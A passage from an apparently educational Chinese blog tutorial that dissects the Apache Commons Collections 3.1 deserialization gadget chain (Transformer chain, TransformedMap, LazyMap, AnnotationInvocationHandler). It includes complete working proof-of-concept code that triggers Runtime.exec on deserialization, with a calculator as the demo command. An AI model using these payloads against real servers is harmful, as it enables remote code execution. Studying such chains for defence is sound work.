//另外需要注意在数组的循环中，前一次transform函数的返回值，会作为下一次transform函数的object参数输入。 &#125; return object; &#125; 漏洞链org.apache.commons.collections.map.AbstractInputCheckedMapDecorator.MapEntry#setValue 1234public Object setValue(Object value) &#123; value = this.parent.checkSetValue(value);//进入此处 return super.entry.setValue(value);&#125; org.apache.commons.collections.map.TransformedMap#checkSetValue TransformedMap是一种重写map类型的set函数和Map.Entry类型的setValue函数去调用转换链的Map类型。 123protected Object checkSetValue(Object value) &#123; return this.valueTransformer.transform(value);//进入此处&#125; org.apache.commons.collections.functors.ChainedTransformer#transform 由于TransformedMap具有commons_collections的转变特性，当赋值一个键值对的时候会自动对输入值进行预设的Transformer的调用。 123456789public Object transform(Object object) &#123; for(int i = 0; i &lt; this.iTransformers.length; ++i) &#123; //循环进入此处，先进入1次ConstantTransformer.class，再3次InvokerTransformer.class object = this.iTransformers[i].transform(object); //另外需要注意在数组的循环中，前一次transform函数的返回值，会作为下一次transform函数的object参数输入。 &#125; return object;&#125; 接下来仔细看这个循环，首先用IDEA查看我们传进来的这个参数iTransformers这个数组： org.apache.commons.collections.functors.ConstantTransformer#transform 首先第一次进入transform函数，它返回的是class java.lang.Runtime这个类对象。 123public Object transform(Object input) &#123; return this.iConstant;&#125; 从第二次循环开始，就会进入org.apache.commons.collections.functors.InvokerTransformer#transform了，可以看到这次进入transform函数的参数object就变成了上一次返回的class java.lang.Runtime。 仔细看这次的transform函数： 1234567891011121314151617181920public Object transform(Object input) &#123; if (input == null) &#123; return null; &#125; else &#123; try &#123; //获取input对象的class Class cls = input.getClass(); //根据iMethodName、iParamTypes选择cls中的一个方法 Method method = cls.getMethod(this.iMethodName, this.iParamTypes); //根据iArgs参数调用这个方法 return method.invoke(input, this.iArgs); &#125; catch (NoSuchMethodException var5) &#123; throw new FunctorException(\"InvokerTransformer: The method '\" + this.iMethodName + \"' on '\" + input.getClass() + \"' does not exist\"); &#125; catch (IllegalAccessException var6) &#123; throw new FunctorException(\"InvokerTransformer: The method '\" + this.iMethodName + \"' on '\" + input.getClass() + \"' cannot be accessed\"); &#125; catch (InvocationTargetException var7) &#123; throw new FunctorException(\"InvokerTransformer: The method '\" + this.iMethodName + \"' on '\" + input.getClass() + \"' threw an exception\", var7); &#125; &#125; &#125; 重点来了！！！ 可以看到代码中直接就调用了invoke方法，调用一系列参数，这就是触发点，接下来仔细看。 明显的反射机制，可见InvokerTransformer就是我们的触发任意代码执行处，看看源码中的文件描述：先看看我们需要关注的InvokerTransformer类的描述： 1234/** * Transformer implementation that creates a new object instance by reflection. * 通过反射机制创建一个新的对象实例的转换器实现 我们可以这里有经典的反射机制调用，在细节分析前我们先整理一下调用栈，但不需要很理解。 123456Map.Entry 类型setValue(\"foobar\")=&gt; AbstracInputCheckedMapDecorator.setValue()=&gt; TransformedMap.checkSetValue()=&gt; ChainedTransformer.transform(Object object) 根据数组，先进入 =&gt; ConstantTransformer.transform(Object input) 再进入 =&gt; InvokerTransformer.transform(Object input) PoC构造目标： 首先明确我们的最终目的是为了执行语句Runtime.getRuntime().exec(&quot;calc.exe&quot;); Runtime.getRuntime：获取一个Runtime的实例 exec()：调用实例的exec函数 因为漏洞函数最后是通过反射机制调用任意这个语句先转化成反射机制如下（后面需要用到）： 1234567Class.forName(\"java.lang.Runtime\").getMethod(\"exec\", String.class).invoke(Class.forName(\"java.lang.Runtime\").getMethod(\"getRuntime\").invoke(Class.forName(\"java.lang.Runtime\"))//此处在获取实例,\"/Applications/Calculator.app/Contents/MacOS/Calculator\") 第一步：InvokerTransformer再回看反射机制触发函数InvokerTransformer类的transform(Object input)（做了简化处理，只留取重点部分）： 1234public Object transform(Object input) &#123; Class cls = input.getClass(); Method method = cls.getMethod(this.iMethodName, this.iParamTypes); return method.invoke(input, this.iArgs); 通过构造的反射机制以及以上代码进行填空，可以得出当变量等于以下值时，可形成命令执行： 1234Object input=Class.forName(\"java.lang.Runtime\").getMethod(\"getRuntime\").invoke(Class.forName(\"java.lang.Runtime\"));this.iMethodName=\"exec\"this.iParamTypes=String.classthis.iArgs=\"/Applications/Calculator.app/Contents/MacOS/Calculator\" 那么在InvokerTransformer类源码中我们可以找到赋值this.iMethodName,this.iParamTypes,this.iArgs的构造函数: 12345public InvokerTransformer(String methodName, Class[] paramTypes, Object[] args) &#123; this.iMethodName = methodName; this.iParamTypes = paramTypes; this.iArgs = args;&#125; 以下测试代码直接调用InvokerTransformer通过反射执行任意命令： 123456789101112public static void main(String[] args) throws Exception &#123; //通过构造函数，输入对应格式的参数，对iMethodName、iParamTypes、iArgs进行赋值 InvokerTransformer a = new InvokerTransformer( \"exec\", new Class[]&#123;String.class&#125;, new String[]&#123;\"/Applications/Calculator.app/Contents/MacOS/Calculator\"&#125; ); //构造input Object input=Class.forName(\"java.lang.Runtime\").getMethod(\"getRuntime\").invoke(Class.forName(\"java.lang.Runtime\")); //执行 a.transform(input);&#125; 直接成功:) 第二步 ChainedTransformer弹出了计算器！好像很厉害的样子！然后我们来模拟一下利用场景： 为了方便，攻击者受害者写在同一函数中 使用文件写入，代替网络传输 由于InvokerTransformer继承了Serializable类，是可以成功序列化的 123456789101112131415161718192021public static void main(String[] args) throws Exception &#123; //模拟攻击 //1.客户端构造序列化payload，使用写入文件模拟发包攻击 InvokerTransformer a = new InvokerTransformer( \"exec\", new Class[]&#123;String.class&#125;, new String[]&#123;\"/Applications/Calculator.app/Contents/MacOS/Calculator\"&#125;); FileOutputStream f = new FileOutputStream(\"payload.bin\"); ObjectOutputStream fout = new ObjectOutputStream(f); fout.writeObject(a); //2.服务端从文件中读取payload模拟接受包，然后触发漏洞 //服务端反序列化payload读取 FileInputStream fi = new FileInputStream(\"payload.bin\"); ObjectInputStream fin = new ObjectInputStream(fi); //神奇第一处：服务端需要自主构造恶意input Object input=Class.forName(\"java.lang.Runtime\").getMethod(\"getRuntime\").invoke(Class.forName(\"java.lang.Runtime\")); //神奇第二处：服务端需要将客户端输入反序列化成InvokerTransformer格式，并在服务端自主传入恶意参数input InvokerTransformer a_in = (InvokerTransformer) fin.readObject(); a_in.transform(input);&#125; 我们会发现如果我们要直接利用这个反射机制作为漏洞的话，需要服务端的开发人员： 帮我们写一个payload作为input； 接受客户端输入参数，反序列化成InvokerTransformer类 再刻意调用InvokerTransformer类的transform函数 实际上…..只有开发人员是自己人的情况下才满足条件吧…… 所以我们面临一些问题： payload肯定需要在客户端可以自定义构造，再传输进入服务端 服务端需要把我们的输入exp反序列化成一个在代码中可能使用到的类 并且在代码正常操作中会调用这个类中的一个可触发漏洞地函数（当然这个函数最后会进入我们InvokerTransformer类的transform函数，从而形成命令执行） 如果这个反序列化的类和这个类触发命令执行的方法可以在一个readObject复写函数中恰好触发，就对于服务端上下文语句没有要求了！ 这边假如像预期这样，是对服务端上下文没有要求，因为只要执行readObject就肯定会命令执行，不需要其他上下文条件。但是对于服务端版本环境是有要求的，之后会说到 那么我们一个个来解决问题：首先使客户端自定义paylaod！ 下面我们需要关注ChainedTransformer这个类,首先看一下这个类的描述： 12345678/** * Transformer implementation that chains the specified transformers together. * &lt;p&gt; * The input object is passed to the first transformer. The transformed result * is passed to the second transformer and so on. * 将指定的转换器连接在一起的转化器实现。 输入的对象将被传递到第一个转化器，转换结果将会输入到第二个转化器，并以此类推 可以知道他会把我们的Transformer变成一个串，再逐一执行，其中这个操作对应的就是ChainedTransformer类的transform函数： 12345678910111213/** * Transforms the input to result via each decorated transformer * * @param object the input object passed to the first transformer * @return the transformed result */ public Object transform(Object object) &#123; for (int i = 0; i &lt; iTransformers.length; i++) &#123; //熟悉，这就是刚才上面提到的循环 object = iTransformers[i].transform(object); &#125; return object; &#125; 这里会遍历iTransformers数组，依次调用这个数组中每一个Transformer的transform，并串行传递执行结果。 首先确定iTransformers可控，iTransformers数组是通过ChainedTransformer类的构造函数赋值的。 12345678910/** * Constructor that performs no validation. * Use &lt;code&gt;getInstance&lt;/code&gt; if you want that. * * @param transformers the transformers to chain, not copied, no nulls */ public ChainedTransformer(Transformer[] transformers) &#123; super();//这个super不清楚做了啥， iTransformers = transformers; &#125; 那么我们知道可以自定义iTransformers的内容，我们已有条件如下： 1234567891011121314//最终执行目标 Class.forName(\"java.lang.Runtime\") .getMethod(\"exec\", String.class) .invoke( Class.forName(\"java.lang.Runtime\").getMethod(\"getRuntime\").invoke(Class.forName(\"java.lang.Runtime\"))//此处在获取实例 , \"/Applications/Calculator.app/Contents/MacOS/Calculator\" ) //InvokeTransformer关键语句： public Object transform(Object input) &#123; Class cls = input.getClass(); Method method = cls.getMethod(this.iMethodName, this.iParamTypes); return method.invoke(input, this.iArgs); &#125; 再看到InvokeTransformer代码我们需要引出一个注意点： 这里我们需要注意到input.getClass()这个方法使用上的一些区别： 当input是一个类的实例对象时，获取到的是这个类 当input是一个类时，获取到的是java.lang.Class 可以使用如下代码验证，这里不再赘述 12345678Object a = Runtime.getRuntime(); Class b = Runtime.class; System.out.println(a.getClass()); System.out.println(b.getClass()); //结果 //class java.lang.Runtime //class java.lang.Class 基于之前写的代码： 1234567//只调用InvokeTransformer的情况如下： InvokerTransformer a = new InvokerTransformer( \"exec\", new Class[]&#123;String.class&#125;, new String[]&#123;\"/Applications/Calculator.app/Contents/MacOS/Calculator\"&#125;); Object input=Class.forName(\"java.lang.Runtime\").getMethod(\"getRuntime\").invoke(Class.forName(\"java.lang.Runtime\")); 我们也可以知道input的为Runtime类的对象，所以cls就是Runtime类，所以cls.getMethod可以找到exec方法，直接进行调用。 先把a封装成ChainedTransformer格式，但是payload还是在外面 123456789//客户端构造payload Transformer[] transformers = new Transformer[] &#123; new InvokerTransformer(\"exec\",new Class[]&#123;String.class&#125;,new String[]&#123;\"/Applications/Calculator.app/Contents/MacOS/Calculator\"&#125;); &#125; Transformer transformerChain = new ChainedTransformer(transformers); //服务端触发所需内容 Object input=Class.forName(\"java.lang.Runtime\").getMethod(\"getRuntime\").invoke(Class.forName(\"java.lang.Runtime\")); transformerChain.transform(input);//此处必须为input，作为第一个输入 把payload放入Transformer数组中，需要转化成特定的Transformer格式才行。 第三步 ConstantTransformer -&gt; Runtime实例序列化我们找到ConstantTransformer类跟InvokkerTransformer一样继承Transforme父类，可以进入数组顾名思义ConstantTransformer类其实就只会存放一个常量；它的构造函数会写入这个变量，他的transform函数会返回这个变量。把Runtime实例写入这个变量： 12345678Transformer[] transformers = new Transformer[] &#123; //以下两个语句等同,一个是通过反射机制得到，一个是直接调用得到Runtime实例 // new ConstantTransformer(Class.forName(\"java.lang.Runtime\").getMethod(\"getRuntime\").invoke(Class.forName(\"java.lang.Runtime\"))), new ConstantTransformer(Runtime.getRuntime()), new InvokerTransformer(\"exec\", new Class[] &#123;String.class &#125;, new Object[] &#123;\"/Applications/Calculator.app/Contents/MacOS/Calculator\"&#125;) &#125;; Transformer transformerChain = new ChainedTransformer(transformers); transformerChain.transform(null);//此处输入可以为任意值，因为不会被使用到，相当于初始第一个输入为我们设置的常量 以上代码可以成功弹框执行！这里其实就是把之前的input放进chain里面去了。 那么我们模拟一下序列化与反序列化过程！ 1234567891011121314151617//客户端构造payload Transformer[] transformers = new Transformer[] &#123; new ConstantTransformer(Class.forName(\"java.lang.Runtime\").getMethod(\"getRuntime\").invoke(Class.forName(\"java.lang.Runtime\"))), new InvokerTransformer(\"exec\", new Class[] &#123;String.class &#125;, new Object[] &#123;\"/Applications/Calculator.app/Contents/MacOS/Calculator\"&#125;) &#125;; Transformer transformerChain = new ChainedTransformer(transformers); //payload序列化写入文件，模拟网络传输 FileOutputStream f = new FileOutputStream(\"payload.bin\"); ObjectOutputStream fout = new ObjectOutputStream(f); fout.writeObject(transformerChain); //服务端反序列化payload读取 FileInputStream fi = new FileInputStream(\"payload.bin\"); ObjectInputStream fin = new ObjectInputStream(fi); //服务端反序列化成ChainedTransformer格式，并在服务端自主传入恶意参数input Transformer transformerChain_now = (ChainedTransformer) fin.readObject(); transformerChain_now.transform(null); 但是因为Runtime类的定义没有继承Serializable类，所以是不支持反序列化的。 第四步 服务端构造Runtime示例既然我们没法在客户端序列化写入Runtime的实例，那就让服务端执行我们的命令生成一个Runtime实例呗？我们知道Runtime的实例是通过Runtime.getRuntime()来获取的，而InvokerTransformer里面的反射机制可以执行任意函数。同时，我们已经成功执行过Runtime类里面的exec函数。讲道理肯定是没问题的. 我们先看getRuntime方法的参数： 123public static Runtime getRuntime() &#123; return currentRuntime;&#125; 没有参数，那就非常简单了 12345678910Transformer[] transformers = new Transformer[] &#123; new ConstantTransformer(Runtime.class),//得到Runtime class //由于InvokerTransformer的构造函数要求传入Class类型的参数类型，和Object类型的参数数值，所以封装一下，下面也一样 //上面传入Runtime.class，调用Runtime class的getRuntime方法（由于是一个静态方法，invoke调用静态方法，传入类即可） new InvokerTransformer(\"getRuntime\",new Class[]&#123;&#125;,new Object[]&#123;&#125;), //上面Runtime.getRuntime()得到了实例，作为这边的输入(invoke调用普通方法，需要传入类的实例) new InvokerTransformer(\"exec\", new Class[] &#123;String.class &#125;, new Object[] &#123;\"/Applications/Calculator.app/Contents/MacOS/Calculator\"&#125;) &#125;; Transformer transformerChain = new ChainedTransformer(transformers); transformerChain.transform(null); invoke的return是根据被调用的函数return啥，invoke就return啥。就好比我invoke一个我自定义的方法a，在a中，我return了字符串”1”。那么就是invoke的结果就是字符串”1”。看以上的过程就是第一次Runtime.getRuntime()的结果输入了下一个InvokerTransformer 但是！！！ 1234567//InvokeTransformer关键语句： public Object transform(Object input) &#123;//input为我们设置的常量Runtime.class Class cls = input.getClass();//！！！这里由于input是一个类，会得到java.lang.Class //在java.lang.Class类中去寻找getRuntime方法企图得到Runtime类对象，此处报错！！ Method method = cls.getMethod(this.iMethodName, this.iParamTypes); return method.invoke(input, this.iArgs); &#125; 还是会陷入死胡同： 得到Runtime类实例才能调用exec方法。而得到Runtime类实例作为input，才能得到Runtime class，才能找到getRuntime方法，得到Runtime类实例……… 破局：反射！！！还是得反射去搞： 目前是开头不能获得Class.forName(&quot;java.lang.Runtime&quot;)，只能得到Class.forName(&quot;java.lang.Class&quot;) 我们的最终目的是执行Class.forName(&quot;java.lang.Runtime&quot;).getMethod(&quot;getRuntime&quot;).invoke(Class.forName(&quot;java.lang.Runtime&quot;) 这里的思路是： 对于Class.forName(&quot;java.lang.Class&quot;)环境下，需要先把getMethod方法拿到。 再用getMethod方法去把获取Runtime类中的getRuntime函数反射出来，哪个类中调用getMethod去获取方法，实际上是由invoke函数里面的的第一个参数obj决定的 再通过反射机制获取反射机制中的invoke方法，执行上面获取的getRuntime函数 先来获取getRuntime类 12345//目标语句Class.forName(\"java.lang.Runtime\").getMethod(\"getRuntime\")//使用java.lang.Class开头Class.forName(\"java.lang.Class\").getMethod(\"getMethod\", new Class[] &#123;String.class, Class[].class &#125;).invoke(Class.forName(\"java.lang.Runtime\"),\"getRuntime\",new Class[0]);//invoke函数的第一个参数是Runtime类，我们需要在Runtime类中去执行getMethod，获取getRuntime参数 先来构造第一层： 123Class cls = input.getClass();//cls = java.lang.ClassMethod method = cls.getMethod(this.iMethodName, this.iParamTypes); //getMethod方法return method.invoke(input, this.iArgs); //在Runtime中找getRuntime方法，并返回这个方法 12345public InvokerTransformer(String methodName, Class[] paramTypes, Object[] args) &#123; this.iMethodName = methodName; this.iParamTypes = paramTypes; this.iArgs = args;&#125; 对照着来，构造如下： 1234567Transformer[] transformers = new Transformer[] &#123; new ConstantTransformer(Runtime.class),//先获取Runtime实例 new InvokerTransformer(\"getMethod\", new Class[] &#123;String.class, Class[].class &#125;, new Object[] &#123;\"getRuntime\", new Class[0] &#125;), //还需要填充，调用getRuntime得到Runtime实例,第一个参数是获取的方法，这里先获取getMethod方法，第二个是参数列表，这个是getMethod方法的参数列表，第三个参数是invoke方法的参数列表，这里我们想先反射出来getRuntime参数，Class[0]是用来占位的，这部分在经过transform函数处理之后，返回的是getRuntime()这样的一个方法。 new InvokerTransformer(\"exec\", new Class[] &#123;String.class &#125;, new Object[] &#123;\"/Applications/Calculator.app/Contents/MacOS/Calculator\"&#125;) //最后一轮是先获取exec方法，invoke方法的命令是“/Applications/Calculator.app/Contents/MacOS/Calculator”&#125;; 但是这里并不是这么简单的，细节： 这里需要清楚的是，在第二层出来之后，需要注意的是返回的是getRuntime这个方法，是Method类型的。它会进入到下一层循环，所以没法继续invoke这里需要进行反射出来invoke方法。 继续构造： 1234//input=getRuntime这个方法Class cls = input.getClass();//cls = java.lang.Method（getRuntime方法是method类）Method method = cls.getMethod(this.iMethodName, this.iParamTypes); //在method类中找到invoke方法，method=invoke方法return method.invoke(input, this.iArgs); //调用invoke方法，input=getRuntime这个方法，传入自定义的参数 以上最后一步有点复杂，method就是invoke方法，相当于使用invoke调用了invoke函数。首先this.iMethodName, this.iParamTypes是根据invoke接口而定的： 1234public Object invoke(Object obj, Object... args)//this.iMethodName=\"invoke\"//this.iParamTypes=new Class[] &#123;Object.class, Object[].class &#125;//外面class、Object封装是InvokerTransformer类的构造函数要求 按照invoke中的input才是它要调用的环境的准则。invoke方法.invoke(input, this.iArgs)实际上等于input.invoke(this.iArgs)，而input=getRuntime方法，那么只要填入this.iArgs就好了 又由于getRuntime是个静态函数，不用太纠结输入obj，写作null。getRuntime方法不需要参数。this.iArgs=null,new Object[0] 那么整合就如下： 123456Transformer[] transformers = new Transformer[] &#123; new ConstantTransformer(Runtime.class), new InvokerTransformer(\"getMethod\", new Class[] &#123;String.class, Class[].class &#125;, new Object[] &#123;\"getRuntime\", new Class[0] &#125;), new InvokerTransformer(\"invoke\", new Class[] &#123;Object.class, Object[].class &#125;, new Object[] &#123;null, new Object[0] &#125;), new InvokerTransformer(\"exec\", new Class[] &#123;String.class &#125;, new Object[] &#123;\"/Applications/Calculator.app/Contents/MacOS/Calculator\"&#125;)&#125;; 一个字：妙！ 第五步 TransformedMap我们看一下目前的攻击流程 12345678910111213141516171819202122232425262728public class commons_collections_3_1 &#123; public static void main(String[] args) throws Exception &#123; //1.客户端构建攻击代码 //此处构建了一个transformers的数组，在其中构建了任意函数执行的核心代码 Transformer[] transformers = new Transformer[] &#123; new ConstantTransformer(Runtime.class), new InvokerTransformer(\"getMethod\", new Class[] &#123;String.class, Class[].class &#125;, new Object[] &#123;\"getRuntime\", new Class[0] &#125;), new InvokerTransformer(\"invoke\", new Class[] &#123;Object.class, Object[].class &#125;, new Object[] &#123;null, new Object[0] &#125;), new InvokerTransformer(\"exec\", new Class[] &#123;String.class &#125;, new Object[] &#123;\"/Applications/Calculator.app/Contents/MacOS/Calculator\"&#125;) &#125;; //将transformers数组存入ChaniedTransformer这个继承类 Transformer transformerChain = new ChainedTransformer(transformers); //payload序列化写入文件，模拟网络传输 FileOutputStream f = new FileOutputStream(\"payload.bin\"); ObjectOutputStream fout = new ObjectOutputStream(f); fout.writeObject(transformerChain); //2.服务端读取文件，反序列化，模拟网络传输 FileInputStream fi = new FileInputStream(\"payload.bin\"); ObjectInputStream fin = new ObjectInputStream(fi); //服务端反序列化成ChainedTransformer格式，再调用transform函数 Transformer transformerChain_now = (ChainedTransformer) fin.readObject(); transformerChain_now.transform(null); &#125;&#125; 如何提高利用度？ 分装成Map由于我们得到的是ChainedTransformer，一个转换链，TransformedMap类提供将map和转换链绑定的构造函数，只需要添加数据至map中就会自动调用这个转换链执行payload。 这样我们就可以把触发条件从显性的调用转换链的transform函数延伸到修改map的值。很明显后者是一个常规操作，极有可能被触发。 查看org.apache.commons.collections.map.TransformedMap#decorate源码： try一下： 123456789101112131415161718192021222324252627282930313233343536public static void main(String[] args) throws Exception &#123; //1.客户端构建攻击代码 //此处构建了一个transformers的数组，在其中构建了任意函数执行的核心代码 Transformer[] transformers = new Transformer[] &#123; new ConstantTransformer(Runtime.class), new InvokerTransformer(\"getMethod\", new Class[] &#123;String.class, Class[].class &#125;, new Object[] &#123;\"getRuntime\", new Class[0] &#125;), new InvokerTransformer(\"invoke\", new Class[] &#123;Object.class, Object[].class &#125;, new Object[] &#123;null, new Object[0] &#125;), new InvokerTransformer(\"exec\", new Class[] &#123;String.class &#125;, new Object[] &#123;\"/Applications/Calculator.app/Contents/MacOS/Calculator\"&#125;) &#125;; //将transformers数组存入ChaniedTransformer这个继承类 Transformer transformerChain = new ChainedTransformer(transformers); //创建Map并绑定transformerChina Map innerMap = new HashMap(); innerMap.put(\"value\", \"value\"); //给予map数据转化链 Map outerMap = TransformedMap.decorate(innerMap, null, transformerChain); //payload序列化写入文件，模拟网络传输 FileOutputStream f = new FileOutputStream(\"payload.bin\"); ObjectOutputStream fout = new ObjectOutputStream(f); fout.writeObject(outerMap); //2.服务端接受反序列化，出发漏洞 //读取文件，反序列化，模拟网络传输 FileInputStream fi = new FileInputStream(\"payload.bin\"); ObjectInputStream fin = new ObjectInputStream(fi); //服务端反序列化成Map格式，再调用transform函数 Map outerMap_now = (Map)fin.readObject(); //2.1可以直接map添加新值，触发漏洞 //outerMap_now.put(\"123\", \"123\"); //2.2也可以获取map键值对，修改value，value为value，foobar,触发漏洞 Map.Entry onlyElement = (Map.Entry) outerMap.entrySet().iterator().next(); onlyElement.setValue(\"foobar\");&#125; 有效的。 lazyMap版本直接上PoC： 12345678910111213141516171819202122232425262728293031323334353637383940public class lazyMap &#123; public static void main(String[] args) throws ClassNotFoundException, NoSuchMethodException, IllegalAccessException, InvocationTargetException, InstantiationException, IOException &#123; Transformer[] transformers_exec = new Transformer[]&#123; new ConstantTransformer(Runtime.class), new InvokerTransformer(\"getMethod\",new Class[]&#123;String.class,Class[].class&#125;,new Object[]&#123;\"getRuntime\",null&#125;), new InvokerTransformer(\"invoke\",new Class[]&#123;Object.class, Object[].class&#125;,new Object[]&#123;null,null&#125;), new InvokerTransformer(\"exec\",new Class[]&#123;String.class&#125;,new Object[]&#123;\"/Applications/Calculator.app/Contents/MacOS/Calculator\"&#125;) &#125;; Transformer chain = new ChainedTransformer(transformers_exec); HashMap innerMap = new HashMap(); innerMap.put(\"value\",\"ddddddd\"); Map lazyMap = LazyMap.decorate(innerMap,chain); Class clazz = Class.forName(\"sun.reflect.annotation.AnnotationInvocationHandler\"); Constructor cons = clazz.getDeclaredConstructor(Class.class,Map.class); cons.setAccessible(true); // 创建LazyMap的handler实例 InvocationHandler handler = (InvocationHandler) cons.newInstance(Override.class,lazyMap); // 创建LazyMap的动态代理实例 Map mapProxy = (Map) Proxy.newProxyInstance(LazyMap.class.getClassLoader(),LazyMap.class.getInterfaces(), handler); // 创建一个AnnotationInvocationHandler实例，并且把刚刚创建的代理赋值给this.memberValues InvocationHandler handler1 = (InvocationHandler)cons.newInstance(Override.class, mapProxy); // 序列化 ByteArrayOutputStream baos = new ByteArrayOutputStream(); ObjectOutputStream oos = new ObjectOutputStream(baos); oos.writeObject(handler1); oos.flush(); oos.close(); // 本地模拟反序列化 ByteArrayInputStream bais = new ByteArrayInputStream(baos.toByteArray()); ObjectInputStream ois = new ObjectInputStream(bais); Object obj = (Object) ois.readObject(); &#125;&#125; 也是可以的 第六步 寻找readObject复写点上面的PoC还是有点别扭，需要服务端配合将反序列化内容反序列化为map，并对值进行修改。 在jdk1.7中就存在一个完美的readobject复写点的类sun.reflect.annotation.AnnotationInvocationHandler。看他的构造函数： 123456789AnnotationInvocationHandler(Class&lt;? extends Annotation&gt; var1, Map&lt;String, Object&gt; var2) &#123; Class[] var3 = var1.getInterfaces(); if (var1.isAnnotation() &amp;&amp; var3.length == 1 &amp;&amp; var3[0] == Annotation.class) &#123;//var1满足这个if条件时 this.type = var1;//传入的var1到this.type this.memberValues = var2;//我们的map传入this.memberValues &#125; else &#123; throw new AnnotationFormatError(\"Attempt to create proxy for a non-annotation type.\"); &#125;&#125; readObject复写函数： 12345678910111213141516171819202122232425262728293031private void readObject(ObjectInputStream var1) throws IOException, ClassNotFoundException &#123; //默认反序列化,这里是前半部分代码 var1.defaultReadObject(); AnnotationType var2 = null; try &#123; //这里的this.type是我们在实例化的时候传入的jdk自带的Target.class //之前的poc语句是这样Object instance = ctor.newInstance(Target.class, outerMap); var2 = AnnotationType.getInstance(this.type); &#125; catch (IllegalArgumentException var9) &#123; throw new InvalidObjectException(\"Non-annotation type in annotation serial stream\"); &#125; Map var3 = var2.memberTypes();// Iterator var4 = this.memberValues.entrySet().iterator();//获取我们构造map的迭代器 while(var4.hasNext()) &#123; Entry var5 = (Entry)var4.next();//遍历map迭代器 String var6 = (String)var5.getKey();//获取key的名称 Class var7 = (Class)var3.get(var6);//获取var2中相应key的class类？这边具体var3是什么个含义不太懂，但是肯定var7、8两者不一样 if (var7 != null) &#123; Object var8 = var5.getValue();//获取map的value if (!var7.isInstance(var8) &amp;&amp; !(var8 instanceof ExceptionProxy)) &#123; //两者类型不一致，给var5赋值！！具体赋值什么已经不关键了！只要赋值了就代表执行命令成功 var5.setValue((new AnnotationTypeMismatchExceptionProxy(var8.getClass() + \"[\" + var8 + \"]\")).setMember((Method)var2.members().get(var6))); &#125; &#125; &#125; &#125;&#125; 虽然相对于这个类具体做什么，实在是没有精力去搞清楚了，但是它最终对于我们传入构造函数的map进行遍历赋值。这样就弥补了我们之前反序列化需要服务端存在一些条件的不足，形成完美反序列化攻击。 最终模拟攻击代码： 123456789101112131415161718192021222324252627282930313233343536public static void main(String[] args) throws Exception &#123; //1.客户端构建攻击代码 //此处构建了一个transformers的数组，在其中构建了任意函数执行的核心代码 Transformer[] transformers = new Transformer[] &#123; new ConstantTransformer(Runtime.class), new InvokerTransformer(\"getMethod\", new Class[] &#123;String.class, Class[].class &#125;, new Object[] &#123;\"getRuntime\", new Class[0] &#125;), new InvokerTransformer(\"invoke\", new Class[] &#123;Object.class, Object[].class &#125;, new Object[] &#123;null, new Object[0] &#125;), new InvokerTransformer(\"exec\", new Class[] &#123;String.class &#125;, new Object[] &#123;\"/Applications/Calculator.app/Contents/MacOS/Calculator\"&#125;) &#125;; //将transformers数组存入ChaniedTransformer这个继承类 Transformer transformerChain = new ChainedTransformer(transformers); //创建Map并绑定transformerChina Map innerMap = new HashMap(); innerMap.put(\"value\", \"value\"); //给予map数据转化链 Map outerMap = TransformedMap.decorate(innerMap, null, transformerChain); //反射机制调用AnnotationInvocationHandler类的构造函数 Class cl = Class.forName(\"sun.reflect.annotation.AnnotationInvocationHandler\"); Constructor ctor = cl.getDeclaredConstructor(Class.class, Map.class); //取消构造函数修饰符限制 ctor.setAccessible(true); //获取AnnotationInvocationHandler类实例 Object instance = ctor.newInstance(Target.class, outerMap); //payload序列化写入文件，模拟网络传输 FileOutputStream f = new FileOutputStream(\"payload.bin\"); ObjectOutputStream fout = new ObjectOutputStream(f); fout.writeObject(instance); //2.服务端读取文件，反序列化，模拟网络传输 FileInputStream fi = new FileInputStream(\"payload.bin\"); ObjectInputStream fin = new ObjectInputStream(fi); //服务端反序列化 fin.readObject();&#125; 至此，我们在客户端构造了payload发送至服务端，只要服务端： 对我们的输入进行反序列化 jdk版本为1.7 就可以直接完成命令执行，完美！ 但是！！！ AnnotationType.getInstance(this.type)是一个关键的有关注解的操作。所以我们需要先来了解一下java的注解。 补充知识：注解Target.class其实是java提供的的元注解（因为是注解所以之后写成特有的形式@Target）。除此之外还有@Retention、@Documented、@Inherited，所谓元注解就是标记其他注解的注解。 @Target 用来约束注解可以应用的地方（如方法、类或字段） @Retention用来约束注解的生命周期，分别有三个值，源码级别（source），类文件级别（class）或者运行时级别（runtime) @Documented 被修饰的注解会生成到javadoc中 @Inherited 可以让注解被继承，但这并不是真的继承，只是通过使用@Inherited，可以让子类Class对象使用getAnnotations()获取父类被@Inherited修饰的注解 除此之外注解还可以有注解元素(等同于赋值)。 举个自定义注解的例子： 12345@Target(ElementType.TYPE)@Retention(RetentionPolicy.RUNTIME)public @interface DBTable &#123; String name() default \"\";//default是默认值&#125; 它会被这样使用： 123@DBTable(name = \"MEMBER\")public class Member &#123;&#125; 由于赋值的时候总是用 注解元素 = 值的形式太麻烦了，出现了 value 这个偷懒的语法糖。（这也是为什么之前的@Target(ElementType.TYPE)不是注解元素 = 值的形式） 如果注解元素为value时，就不需要用注解元素 = 值的形式，而是直接写入值就可以赋值为value。 除此之外java还有一些内置注解： @Override：用于标明此方法覆盖了父类的方法 @Deprecated：用于标明已经过时的方法或类 @SuppressWarnnings:用于有选择的关闭编译器对类、方法、成员变量、变量初始化的警告 回过头来看看java.lang.annotation.Target： 123456@Documented//会被写入javadoc文档@Retention(RetentionPolicy.RUNTIME)//生命周期时运行时@Target(ElementType.ANNOTATION_TYPE)//标明注解可以用于注解声明(应用于另一个注解上)public @interface Target &#123; ElementType[] value();//注解元素，一个特定的value语法糖，可以省点力气&#125; 初步了解了java的注解之后，我们回来看AnnotationType.getInstance(this.type)对@Target这个注解的处理，不过多的去纠结内部细节，var2=getInstance会获取到@Target的基本信息，包括注解元素，注解元素的默认值，生命周期，是否继承等等。 var3就是一个注解元素的键值对value这个注解元素，可以取值Ljava.lang.annotation.ElementType类型的值。 123456789101112131415161718//后半部分代码 Map var3 = var2.memberTypes();//&#123;value：ElementType的键值对&#125; Iterator var4 = this.memberValues.entrySet().iterator(); //获取我们构造map的迭代器，无法命令执行的键值对是&#123;key:value&#125; while(var4.hasNext()) &#123; Entry var5 = (Entry)var4.next();//获取到&#123;key:value&#125; String var6 = (String)var5.getKey();//获取键值对的键名key Class var7 = (Class)var3.get(var6); //从@Target的注解元素键值对&#123;value：ElementType的键值对&#125;中去寻找键名为key的值 //于是var7为空,进不到命令执行 if (var7 != null) &#123; //触发命令执行处 &#125; &#125; &#125; &#125;&#125; 这样我们就搞懂了为什么赋值map{key：value}就不行，因为通过AnnotationInvocationHandler#readObject，我们需要保证： 我们poc中提供的this.type的注解要存在注解元素名（为了满足var3不为空）。 